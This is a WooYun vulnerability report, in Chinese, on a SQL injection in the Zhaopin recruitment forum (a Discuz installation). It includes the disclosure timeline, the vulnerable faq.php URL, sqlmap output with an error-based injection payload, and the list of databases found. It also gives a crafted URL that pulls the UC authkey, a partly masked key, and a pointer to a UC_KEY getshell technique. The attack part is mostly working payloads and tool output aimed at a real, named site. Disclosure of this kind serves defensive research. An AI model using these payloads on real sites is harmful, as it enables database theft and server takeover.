wybug_title: 智联招聘论坛从sql注入漏洞到getshell（利用实例）
wybug_detail:
漏洞详情 披露状态：   									2014-07-02：	细节已通知厂商并且等待厂商处理中									2014-07-03：	厂商已经确认，细节仅向厂商公开									2014-07-13：	细节向核心白帽子及相关领域专家公开									2014-07-23：	细节向普通白帽子公开									2014-08-02：	细节向实习白帽子公开									2014-08-16：	细节向公众公开  简要描述： 智联招聘#sql注入漏洞 详细说明：  http://bbs.zhaopin.com/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)sqlmap identified the following injection points with a total of 743 HTTP(s) requests:---Place: GETParameter: gids[100][0]    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: action=grouppermission&gids[99]='&gids[100][0]=-3235) OR 1 GROUP BY CONCAT(0x7166736f71,(SELECT (CASE WHEN (4900=4900) THEN 1 ELSE 0 END)),0x7161676871,FLOOR(RAND(0)*2)) HAVING MIN(0)#---web application technology: PHP 5.2.6, Apacheback-end DBMS: MySQL >= 5.0.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: gids[100][0]    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: action=grouppermission&gids[99]='&gids[100][0]=-3235) OR 1 GROUP BY CONCAT(0x7166736f71,(SELECT (CASE WHEN (4900=4900) THEN 1 ELSE 0 END)),0x7161676871,FLOOR(RAND(0)*2)) HAVING MIN(0)#---web application technology: PHP 5.2.6, Apacheback-end DBMS: MySQL 5available databases [3]:[*] discuz[*] information_schema[*] test都知道这里有注入，那么如何更好的利用呢？下面说一下getshell的方法：
faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20union%20select%201%20from%20(select%20count(*),concat(0x23,(select%20md5(authkey)%20from%20cdb_uc_applications%20limit%201),0x23,floor(rand(0)*2))a%20from%20information_schema.tables%20group%20by%20a)b--%20a
得到uc_key
6fc64444920b*****f9110e0b3d92629
uc_key  getshell WooYun: Discuz的利用UC_KEY进行getshell    漏洞证明：  



   修复方案：     版权声明：转载请注明来源 腰上有胸器@乌云
